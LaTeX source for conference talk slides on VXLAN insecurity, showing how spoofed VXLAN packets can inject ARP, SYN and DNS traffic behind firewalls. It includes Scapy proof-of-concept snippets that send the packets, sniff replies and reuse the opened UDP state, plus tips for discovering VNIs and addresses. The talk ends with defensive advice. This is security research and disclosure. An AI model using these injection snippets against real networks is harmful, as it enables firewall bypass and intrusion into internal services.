\documentclass[Screen16to9,17pt,footrule]{foils}
%\documentclass[16pt,landscape,a4paper,footrule]{foils}

\usepackage{zencurity-slides}
%\usepackage[normalem]{ulem}

\usepackage{multicol}

% VXLAN Security or Injection
% BornHack 2018 regular talk

% VXLAN is an encapsulation protocol becoming more popular with cloud deployments these days. This talk will be a reminder that VXLAN encapsulation by itself does not have any security features, so networks must be protected by other means. The seriousness will be underlined using examples of injection and firewall circumvention with packet injection code examples including data and numbers from real life experiments.

% If you dont protect your VXLAN decapsulation remote layer 2 injection attacks becomes a high risk.
% also my patches for adding VXLAN header to hping3 will be released

% Keywords:
% VXLAN injection

\begin{document}

\rm
\selectlanguage{english}
\mytitlepage{VXLAN Security or Injection}{TROOPERS19 2019}

{\small
Note: My contribution are mostly a PoC of lesser known security issues}


\slide{Why talk about VXLAN RFC7348}

\quote{\small
Virtual Extensible LAN (VXLAN) is a network virtualization technology ... uses a VLAN-like encapsulation technique to {\bf encapsulate OSI layer 2 Ethernet frames} within layer 4 {\bf UDP datagrams}, ... VXLAN endpoints, which terminate VXLAN tunnels and may be either virtual or physical switch ports, are known as {\bf VXLAN tunnel endpoints (VTEPs)}.[2][3]

The VXLAN specification was originally created by VMware, Arista Networks and Cisco.[5][6] Other backers of the VXLAN technology include Huawei,[7] Broadcom, Citrix, Pica8, Cumulus Networks, Dell EMC, Mellanox,[8] FreeBSD,[9] OpenBSD,[10] Red Hat,[11] Joyent, and Juniper Networks.
}

Source for quote:\\
\url{https://en.wikipedia.org/wiki/Virtual_Extensible_LAN}

\vskip 5mm
\centerline{Already in production use}

\vskip 1cm
Security Considerations\\
   TBD.

\slide{Why do this talk}

\hlkimage{12cm}{dragon-drawing-6.jpg}
\begin{list2}
\item New networks being built with production traffic - insecurely
\item Vendors hype their speed of VXLAN implementations, but not the security issues
\item I need help in designing \emph{network patterns} for good VXLAN deployments
\item We need to increase visibility into VXLAN attacks, attacks encapsulated in VXLAN
\item If you use VXLAN across data centers you have a complex problem at your hands
\end{list2}

%// Picture VXLAN security is VLAN hopping and ARP spoofing like its 1999


\slide{Overview VXLAN RFC7348}

\hlkimage{21cm}{vxlan-basic.png}

How does it work?

\begin{list2}
\item Router 1 takes Layer 2 traffic, encapsulates with IP+UDP port 4789, routes
\item Router 2 receives IP+UDP+data, decapsulates, forward/switches layer 2 onto VLAN
%\item Most often VLAN IEEE 802.1q involved too, but not shown
\item Lets only consider two routers
\end{list2}

\centerline{Quite easy to get a working lab with Linux or OpenBSD \smiley}

\slide{But what about security}

{\bf VXLAN does not by itself provide ANY security, none, zip, nothing, nada! \\
No confidentiality. No integrity protection.}



\begin{list2}
\item \emph{Just configure the firewall, router ACL, etc}
\item Just isolate so no-one from the outside can send traffic
\item Then what about from inside your data center, from partners, your servers
\item Vendors does have some documents, like Arista has\\ \url{https://eos.arista.com/vxlan-security/}
\item Cisco has a 2018 55 page \emph{VXLAN EVPN Multi-Site
Design and Deployment} \\
without the word security
\item Security is not detailed as part of the regular "how to setup VXLAN"
\end{list2}


\vskip 1cm
We currently have huge gaps in understanding these issues\\
- and missing security tool coverage

\vskip 5mm

{\small If hackers use GRE and IPv6 to exfiltrate data, why not VXLAN?}

\slide{VXLAN attacks}

\vskip 2cm
So you are saying it is possible to produce VXLAN packets which sent across the internet will be accepted and injected onto layer 2 behind the firewalls and other security devices?!

\vskip 1cm
{\bf\LARGE Exactly!}

\vskip 2cm
And network people has been saying this for many years now, not news, but even more relevant to repeat it now
\slide{VXLAN injection}

\hlkimage{20cm}{vxlan-basic-injection.png}

I tested using my pentest server in one AS, sending across an internet exchange into a production network, towards Arista testing devices - no problems, it's just routed layer 3 IP+UDP packets

\slide{Example attacks}

\begin{alltt}\footnotesize
VXLAN Header:
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|R|R|R|R|I|R|R|R|            Reserved                           |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                VXLAN Network Identifier (VNI) |   Reserved    |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
Inner Ethernet Header:
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|             Inner Destination MAC Address                     |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
| Inner Destination MAC Address | Inner Source MAC Address      |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                Inner Source MAC Address                       |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|OptnlEthtype = C-Tag 802.1Q    | Inner.VLAN Tag Information    |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
\end{alltt}

What is possible:
\begin{list2}
\item Inject ARP traffic, send arbitrary ARP packets to hosts, connectivity DoS
\item Inject SYN traffic behind the firewall, ex web servers behind load balancer
\item Inject UDP packets sourced from inside, even being sent out through firewall
\end{list2}



\slide{Example: Send UDP DNS reqs to inside server}

\hlkimage{22cm}{vxlan-basic-injection-dns.pdf}

%One interesting attack is injecting UDP packets to allow DNS\\
%requests to inside server which might not even have public IP

%\begin{enumerate}
%\item Select target: internal server, 10.0.0.10 and DNS service 53/UDP
%\item Create VXLAN packet(s): DNS request dst 10.0.0.10 UDP dport 53
%\item Source for this probe is your external pentest server
%\item Make sure inside packet has Ethernet destination that reaches server
%\item Send spoofed VXLAN packet across internet
%\item After VXLAN decap this packet is sent to the server
%\item Server process DNS request, send back response
%\item Attacker waiting for the UDP DNS reply, gets it
%\end{enumerate}

{\small Attacker can send UDP DNS request to inside server on RFC1918 destination - server has no external IP or incoming ports forwarded.\\
Tested working with Clavister with DNS UDP probes/requests, no inspection }


\slide{Snippets of Scapy}

First create VXLAN header and inside packet
\begin{alltt}\footnotesize
vxlanport=4789     # RFC 7384 port 4789, Linux kernel default 8472
vni=37             # Usually VNI == destination VLAN {\bf

vxlan=Ether(dst=routermac)/IP(src=vtepsrc,dst=vtepdst)/
   UDP(sport=vxlanport,dport=vxlanport)/VXLAN(vni=vni,flags="Instance")}

broadcastmac="ff:ff:ff:ff:ff:ff"
randommac="00:51:52:01:02:03"
attacker="185.27.115.666"
destination="10.0.0.10"
# port is the one we want to contact inside the firewall
insideport=53
# this port is a high port, just make this look like a normal request
testport=54040
packet={\bf vxlan}/Ether(dst=broadcastmac,src=randommac)/IP(src=attacker,
    dst=destination)/UDP(sport=testport,dport=insideport)/
    DNS(rd=1,id=0xdead,qd=DNSQR(qname="www.wikipedia.org"))
\end{alltt}

{\small Fun fact, Unbound on OpenBSD reply to DNS requests received in Ethernet packets with broadcast destination and IP destination being the IP of the server - confirmed normal IP stack behaviour}


\slide{Send and receive - from another source}

Send and then wait for something, not from same IP bc from\\
inside NAT, but port should be OK
\begin{alltt}\footnotesize
pid = os.fork()
if pid:
    # we are the parent
    print "parent: setting up sniffing"
    # Wait for UDP packet
    data = sniff(filter="udp and port 54040 and net 192.0.2.0/24", count=1)
else:
    # we are the child
    time.sleep(10)
    print "child: sending packet"
    sendp(packet,loop=0)
    print "child: closing"
    sys.exit(0)
#print data.summary()
data[0].show()
\end{alltt}

The source port we used in the inside packet, becomes the destination port in replies from the server - 54040 in example

\slide{Example: Open UDP from inside scenarios}

\hlkimage{23cm}{vxlan-basic-injection-udp-open.pdf}

Inject UDP via VXLAN to create firewall state, will allow\\
reverse UDP requests coming into internal server

%\begin{enumerate}
%\item Select target: internal server, 10.0.0.10 and DNS service 53/UDP
%\item Create VXLAN packet(s): internal packet src 10.0.0.10 UDP sport 53
%\item Destination for this probe is your external pentest server
%\item Make sure inside packet has Ethernet destination of the firewall
%\item Send spoofed VXLAN packet across internet
%\item After VXLAN decap, packet switched to firewall, come from inside
%\item Firewall forwards, creates state, NATs
%\item Attacker waiting for the UDP probe, notice NAT source IP+port
%\item Attacker across regular internet send UDP request to NAT IP+port
%\item Request match state, and is forwarded to internal server on 10.0.0.10
%\end{enumerate}

{\small Tested working with Clavister with DNS UDP probes/requests, weak/no DNS inspection
\vskip 5mm
\centerline{May allow acess to all UDP services? Need more testing}}

\slide{Send and receive - do another request}

Send/receive UDP probe, do another request through the open channel
\begin{alltt}\footnotesize
...
print "After fork and things"
#print data.summary()
data[0].show()

# Dissecting the packet
ip=data[0].getlayer(IP)
udp=data[0].getlayer(UDP)

# Try sending request back through - now open - channel
# Dont forget to reverse the src/dst and ports
packet=Ether(dst=routermac)/IP(src=attacker,dst=ip.src)/
    UDP(sport=udp.dport,dport=udp.sport)/DNS(rd=1,qd=DNSQR(qname="localhost"))
sendp(packet,loop=0)
...
\end{alltt}

Maybe abuse complex protocols such as FTP, SIP etc. to open arbitrary ports?

\slide{Hey, you need a lot of information to do this!}

What I need to do these attacks are:
\begin{list2}
\item Injection end points, IPs of the two routers
\item VLAN IDs and VNIs - VXLAN Network Identifier (VNI)
\item IP addresses, internal subnets
\item MAC addresses - depending on attack
\end{list2}

\slide{Where can I "find" this information}

\begin{list2}
\item MAC addresses, some attacks use broadcast, try default VRRP?
\item VLAN IDs and VNIs - usually 1:1 mapping
\item IP addresses, internal subnets, qualified guesses as to default gateways etc.
\item Injection end points, IPs of the two routers, or one -
port likely be 4789/8472
\item Most of these are not typically considered highly confidential
\item SMTP, HTTP setups often reveal real IP of the server behind etc.
\item Also it is easily possible to produce millions of packets so send/scanning/trying
\item Doing a complete scan of RFC1918 space is certainly possible for some protocols/ports
\item Devices with SNMP public? Doing snmpwalk would get a lot of the above
\item Besides I dont think the hardware VTEP on Arista logs much, if anything
\end{list2}



\vskip 1cm
Any former employee or consultant would know some of this

Do Jazz hands if you think this is possible in real networks


\slide{Next steps - both some offensive and defensive}

\hlkimage{15cm}{vxlan-basic-dos.pdf}

\begin{list2}
\item "Implement further attacks" to devise ways to prevent/block
\item I would love to try everything from  \url{http://www.yersinia.net/}\\ \url{https://tools.kali.org/vulnerability-analysis/yersinia}
\item Advanced attacks and scanning
\item how can we secure VLANs in server networks better
\item Currently brainstorming and enhancing this list into a larger VXLAN test-plan
\end{list2}

\slide{Being defensive is also what TROOPERS is about!}

\hlkimage{19cm}{vxlan-basic-suricata-bro.pdf}

Defensive:
\begin{list2}
\item Many firewalls/IDS/DDoS protection would not see this traffic,\\
do not consider ARP / Layer 2 / Tunnels / VXLAN
\item Tool enhancements work-in-progress, adding VXLAN decap to Bro and Suricata
\item Trying to push knowledge about secure VXLAN deployment
\end{list2}

\slide{Expand tool support Hping3 2018, Bro, Suricata}

\begin{list2}
\item Scapy support VXLAN fast enough for a lot of things
\item Very easy to get first examples working, $<$ 4 hours
\item Scapy is preferred when doing VXLAN inject to one address, \\
receiving on completely different one (like Open UDP from inside scenarios)
\item PoC: adding VXLAN to Hping3 - tool is a bit unsuported, forked
\item Ongoing: adding VXLAN to Bro and Suricata - works on my machine
\vskip 1cm
\item Also 1-way scenarios can use a Linux VXLAN interface and just route into this
\end{list2}

\vskip 1cm
My fork of Hping3 are at \url{https://github.com/kramse/hping-2018}\\
also my patches to Suricata and Bro - being worked on, help me



\slide{Lessons learned}

\begin{list2}
\item When using encapsulating and tunneling like VXLAN - think security
\item Always use TLS and encryption - even on secure local server LANs
\item How do we secure our network from external, internal BGP, internal hosts
\item AAAARRRRRRRGGGHHHHHHH \smiley
\item Stop using VXLAN? Discuss
\end{list2}
\vskip 1cm
Really, help me, what IS the right answer? \smiley

\vskip 1cm

One recommendation: go home and configure ingress and egress filtering BCP38
\vskip 1cm
Thank you for coming. I'll be around until friday.
\end{document}
